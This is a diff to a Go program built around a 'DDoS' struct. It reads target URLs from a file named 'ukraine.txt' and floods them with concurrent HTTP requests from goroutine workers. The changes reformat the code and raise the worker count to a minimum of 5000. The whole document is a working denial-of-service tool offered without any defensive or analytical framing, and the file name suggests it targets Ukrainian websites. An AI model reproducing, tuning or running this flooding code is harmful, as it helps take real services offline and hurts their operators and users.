@@ -1,29 +1,34 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"bufio"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
-	"time"
-	"runtime"
-	"sync/atomic"
-	"math/rand"
 	"os"
 	"os/signal"
-	"syscall"
+	"runtime"
 	"strings"
+	"sync/atomic"
+	"syscall"
+	"time"
 )
 
-const PerCore = 10
-const FilePath = "ukraine.txt"
-const timeout = time.Duration(5 * time.Second)
+const (
+	PerCore  = 10
+	FilePath = "ukraine.txt"
+	timeout  = time.Duration(5 * time.Second)
+	// we should limit nummber of workers base on CPU,
+	// because we are doing IO-bound work
+	minAmountOfWorkers = 5000
+)
 
 type DDoS struct {
-	urls           []string
+	urls          []string
 	amountWorkers int
 
 	successRequest int64
@@ -38,17 +43,17 @@ func New(urls []string, workers int) (*DDoS, error) {
 }
 
 func dialTimeout(network, addr string) (net.Conn, error) {
-    return net.DialTimeout(network, addr, timeout)
+	return net.DialTimeout(network, addr, timeout)
 }
 
 func (d *DDoS) Run() {
 	transport := http.Transport{
-        Dial: dialTimeout,
-    }
+		Dial: dialTimeout,
+	}
 
-    client := http.Client{
-        Transport: &transport,
-    }
+	client := http.Client{
+		Transport: &transport,
+	}
 
 	for i := 0; i < d.amountWorkers; i++ {
 		go func() {
@@ -76,42 +81,51 @@ func init() {
 	rand.Seed(time.Now().UnixNano())
 }
 
-func readFile() ([]string) {
-    file, err := os.Open(FilePath)
-    if err != nil {
-        panic(err)
-    }
-    defer file.Close()
+func readFile() []string {
+	file, err := os.Open(FilePath)
+	if err != nil {
+		panic(err)
+	}
+	defer file.Close()
 
-    scanner := bufio.NewScanner(file)
+	scanner := bufio.NewScanner(file)
 
-    var lines []string
+	var lines []string
 
-    var line string
+	var line string
 
-    for scanner.Scan() {
-    	line = strings.TrimSpace(scanner.Text())
+	for scanner.Scan() {
+		line = strings.TrimSpace(scanner.Text())
 
-    	if line != "" {
+		if line != "" {
 			u, err := url.Parse(line)
 
 			if err != nil || len(u.Host) == 0 {
 				panic(fmt.Errorf("Undefined host or error = %v", err))
 			}
 
-	    	lines = append(lines, line)
-	    }
-    }
+			lines = append(lines, line)
+		}
+	}
 
-    if err := scanner.Err(); err != nil {
-        panic(err)
-    }
+	if err := scanner.Err(); err != nil {
+		panic(err)
+	}
 
-    return lines
+	return lines
+}
+
+func getMaxAmountOfWorkers() int {
+	maxAmountOfWorkers := minAmountOfWorkers
+	if runtime.NumCPU()*PerCore > maxAmountOfWorkers {
+		maxAmountOfWorkers = runtime.NumCPU() * PerCore
+	}
+	return maxAmountOfWorkers
 }
 
 func main() {
-	d, err := New(readFile(), runtime.NumCPU() * PerCore)
+
+	d, err := New(readFile(), getMaxAmountOfWorkers())
 
 	if err != nil {
 		panic(err)
@@ -120,14 +134,14 @@ func main() {
 	d.Run()
 
 	c := make(chan os.Signal)
-    signal.Notify(c, os.Interrupt, syscall.SIGTERM)
-    go func() {
-        <-c
+	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
+	go func() {
+		<-c
 		success, total := d.Result()
 
 		fmt.Println("success / total:", success, " / ", total)
 		os.Exit(1)
-    }()
+	}()
 
-    select{}
+	select {}
 }
